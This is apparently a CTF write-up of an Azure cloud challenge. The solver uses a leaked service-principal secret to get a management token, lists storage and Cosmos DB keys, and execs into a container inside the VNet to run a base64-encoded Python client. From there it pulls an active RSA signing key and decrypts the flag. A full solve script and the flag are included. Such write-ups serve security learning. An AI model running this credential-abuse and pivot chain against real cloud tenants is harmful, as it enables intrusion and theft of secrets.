---
title: "Project Spoof"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: cloud
difficulty: medium
points: 300
flag_format: "pbctf{...}"
author: "vikas1337"
---

# Project Spoof

## summary

azure cloud chall. cred.txt is an entra service principal (svc-proof-migr) that was 'decommissioned but still works'. graph is locked and key vault getSecret is RBAC-denied, but a custom role (via a group) grants DocumentDB/listKeys, Storage/listKeys and ContainerInstance exec. the 'leaked RSA key' sitting in blob storage is a DECOY (a retired key) and archive_notice.txt is just a plaintext notice. the real flag needs a full pivot: listKeys the legacy cosmos account (in a separate RG), then exec into a container that lives inside the VNet to reach cosmos over its private endpoint, pull the ACTIVE signing key, and PKCS1v15-decrypt the auditor sample.

## how i solved it

### 1. cred.txt is a service principal, not a user

```bash
# cred.txt -> tenant / client id / client secret
TENANT=85ec53d2-7d7a-436e-9274-49034b5d4896
CLIENT=9ed6b950-28fc-4316-b6eb-486484b93415
SECRET='<client_secret_from_cred.txt>'

# graph is locked, but client-credentials for ARM works fine
curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d client_id=$CLIENT -d client_secret=$SECRET \
  -d scope=https://management.azure.com/.default -d grant_type=client_credentials > arm_token.json
```

```text
graph /me -> 401 (locked down). ARM token: OK.
object id of the SP: 5fb0fe97-da6c-434f-a821-2dfac6ea57c4
```

### 2. recon the resource group

```bash
AT=$(jq -r .access_token arm_token.json)
curl -s "https://management.azure.com/subscriptions/a8112656-0481-4e41-8d07-3e4168d16a01/resourceGroups/proof-pbpay-rg/resources?api-version=2021-04-01" \
  -H "Authorization: Bearer $AT" | jq -r '.value[] | "\(.type)  \(.name)"'
```

```text
Microsoft.KeyVault/vaults              pbpayvault6dlxck
Microsoft.Storage/storageAccounts      bredarchive6dlxck
Microsoft.ContainerInstance/...        pbpay-processor      <- runs INSIDE the vnet
Microsoft.Network/privateEndpoints     pe-pbpay-cosmos      <- points at a cosmos db
```

### 3. the obvious loot is all decoys

```bash
# key vault: can LIST secret names but getSecret is ForbiddenByRbac (SP only has Reader)
# storage: no listKeys, but data-plane blob RBAC works -> read the container
ST=$(jq -r .access_token storage_token.json)
curl -s "https://bredarchive6dlxck.blob.core.windows.net/migrated-secrets?restype=container&comp=list" \
  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02"
```

```text
archive_notice.txt            -> plaintext 'Archive Retention Notice...' (NOT a ciphertext)
payment_signing_key_2023.pem  -> a real RSA key, but RETIRED. it's the bait.

# decrypting anything with this key is the decoy path. the flag is not here.
```

### 4. read our own effective permissions

```bash
AT=$(jq -r .access_token arm_token.json)
curl -s "https://management.azure.com/subscriptions/a8112656-0481-4e41-8d07-3e4168d16a01/resourceGroups/proof-pbpay-rg/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
  -H "Authorization: Bearer $AT" | jq -r '.value[].actions[]' | grep -i 'listkeys\|exec'
```

```text
Microsoft.DocumentDB/databaseAccounts/listKeys/action
Microsoft.Storage/storageAccounts/listKeys/action
Microsoft.ContainerInstance/containerGroups/containers/exec/action   <- the pivot
```

### 5. listKeys the legacy cosmos db (separate RG)

```bash
AT=$(jq -r .access_token arm_token.json)
# the private endpoint points at a cosmos account in a DIFFERENT rg:
COSMOS=/subscriptions/a8112656-0481-4e41-8d07-3e4168d16a01/resourceGroups/proof-legacy-cosmos-rg/providers/Microsoft.DocumentDB/databaseAccounts/pbpaytxn6dlxck

# NOTE: a bare POST 411s ('Length Required') -> send an explicit empty body
curl -s -X POST "https://management.azure.com$COSMOS/listKeys?api-version=2023-04-15" \
  -H "Authorization: Bearer $AT" -H "Content-Length: 0" -d '' > cosmos_keys.json
jq -r 'keys[]' cosmos_keys.json
```

```text
primaryMasterKey        <- got it
primaryReadonlyMasterKey
secondaryMasterKey
secondaryReadonlyMasterKey
```

### 6. cosmos firewall blocks the internet -> exec into the container

```python
# hitting cosmos directly from my box -> 403: 'Request originated from public internet,
# blocked by firewall'. data plane is only reachable from inside the vnet.
# but we have ContainerInstance exec on pbpay-processor, which IS in the vnet.

# 1) POST .../containers/pbpay-processor/exec -> {webSocketUri, password}
# 2) connect the websocket, and run a stdlib-only cosmos client INSIDE the container
#    (private DNS there resolves pbpaytxn6dlxck -> 10.20.1.5)
ws = websocket.create_connection(exec['webSocketUri'])
ws.send(exec['password'] + '\n')
ws.send('python3 -c "import base64;exec(base64.b64decode(INNER))"\n')  # queries cosmos
```

```text
DBS:  pbpay-prod
COLL: pbpay-prod / pbpay-transactions
DOCS: signing_key_v1 (EXPIRED), signing_key_v2 (ROTATED), signing_key_v3 (ACTIVE),
      transaction_sample ('decrypt with current signing key'), runbook_001, migration_audit
runbook: 'pbpay-signing-cert-new migration FAILED -> signing_key_v3 remains in source db'
```

### 7. decrypt the auditor sample with the ACTIVE key

```python
import base64
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import padding

# signing_key_v3.key_data is base64 of the PEM; sample_data is base64 of a 256-byte ct
key = load_pem_private_key(base64.b64decode(v3_key_data), password=None)
ct  = base64.b64decode(transaction_sample)
print(key.decrypt(ct, padding.PKCS1v15()))
```

```text
b'Flag: pbctf{h4lf_b4ked_listkeys_pwn3d_the_dataplane}\n'
```

## full solve script

```bash
#!/usr/bin/env bash
# project spoof - full chain: listKeys the legacy cosmos, exec-pivot into the
# in-vnet container to reach it over the private endpoint, decrypt the sample.
set -e
TENANT=85ec53d2-7d7a-436e-9274-49034b5d4896
CLIENT=9ed6b950-28fc-4316-b6eb-486484b93415
SECRET='<client_secret_from_cred.txt>'
SUB=a8112656-0481-4e41-8d07-3e4168d16a01
COSMOS=/subscriptions/$SUB/resourceGroups/proof-legacy-cosmos-rg/providers/Microsoft.DocumentDB/databaseAccounts/pbpaytxn6dlxck
CG=/subscriptions/$SUB/resourceGroups/proof-pbpay-rg/providers/Microsoft.ContainerInstance/containerGroups/pbpay-processor

# 1) ARM token (graph is locked, ARM works)
curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d client_id=$CLIENT -d client_secret=$SECRET \
  -d scope=https://management.azure.com/.default -d grant_type=client_credentials > arm.json
AT=$(jq -r .access_token arm.json)

# 2) listKeys the legacy cosmos (needs an explicit empty body or it 411s)
curl -s -X POST "https://management.azure.com$COSMOS/listKeys?api-version=2023-04-15" \
  -H "Authorization: Bearer $AT" -H "Content-Length: 0" -d '' > cosmos_keys.json
KEY=$(jq -r .primaryMasterKey cosmos_keys.json)

# 3) cosmos data plane is firewalled to the vnet only -> exec into pbpay-processor
#    and run a stdlib cosmos client from inside (private dns -> 10.20.1.5).
#    inner_cosmos.py lists dbs/colls and dumps pbpay-transactions.
python3 -m venv venv && ./venv/bin/pip -q install websocket-client
sed "s/__KEY__/$KEY/" inner_cosmos.tmpl.py > inner_cosmos.py
B64=$(base64 -w0 inner_cosmos.py)
curl -s -X POST "https://management.azure.com$CG/containers/pbpay-processor/exec?api-version=2023-05-01" \
  -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
  -d '{"command":"/bin/sh","terminalSize":{"rows":40,"cols":120}}' > exec.json
./venv/bin/python driver.py "$B64" > cosmos_dump.txt   # connects ws, runs inner, captures docs

# 4) pull signing_key_v3 (ACTIVE) + transaction_sample, decrypt
python3 - <<'PY'
import json, base64, re
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import padding
docs = {d['id']: d for d in (json.loads(l[5:]) for l in open('cosmos_dump.txt') if l.startswith('DOC: '))}
key = load_pem_private_key(base64.b64decode(docs['signing_key_v3']['key_data']), password=None)
ct  = base64.b64decode(docs['transaction_sample']['sample_data'])
pt  = key.decrypt(ct, padding.PKCS1v15())
print(re.search(rb'pbctf\{[^}]*\}', pt).group().decode())
PY

```

```text
primaryMasterKey: 6pt5oqmFNaLRhBPLJnFL... (via listKeys)
cosmos firewall: 403 from public internet -> pivoted through pbpay-processor exec
docs: signing_key_v1/v2/v3 + transaction_sample + runbook_001
signing_key_v3 status: ACTIVE (never migrated - the 'half-baked' migration)
[PKCS1v15] -> pbctf{h4lf_b4ked_listkeys_pwn3d_the_dataplane}
```

## flag

```
pbctf{h4lf_b4ked_listkeys_pwn3d_the_dataplane}
```
